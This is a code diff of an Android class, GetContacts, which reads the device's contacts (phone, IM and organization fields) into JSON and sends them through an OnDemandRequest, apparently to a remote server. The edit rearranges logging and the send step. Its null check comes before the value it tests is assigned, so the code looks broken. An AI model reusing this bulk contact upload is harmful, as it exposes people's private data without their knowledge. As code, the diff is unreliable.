@@ -204,15 +204,21 @@ public class GetContacts extends AsyncTask<Context, Void, Void> {
 				jsonInfo.put("im", jsonImId);
 				jsonInfo.put("org", jsonOrganization);
 				jsonObject.put("info", jsonInfo);
-				sendJSONStr = jsonObject.toString();
+				Logging.doLog(LOG_TAG, jsonPhoneType.toString(),
+						jsonPhoneType.toString());
 			}
-			if (jsonAllContact != null) {
+			cur.close();
+			if (sendJSONStr != null) {
+//				Logging.doLog(LOG_TAG, sendJSONStr,
+//						sendJSONStr);
+				sendJSONStr = jsonObject.toString();
+				
 				OnDemandRequest dr = new OnDemandRequest(mContext, type);
-				dr.sendRequest(jsonObject.toString());
-				Logging.doLog(LOG_TAG, sendJSONStr,
-						sendJSONStr);
+				dr.sendRequest(sendJSONStr);
+				
 			}
 		}
+		
 	}
 
 
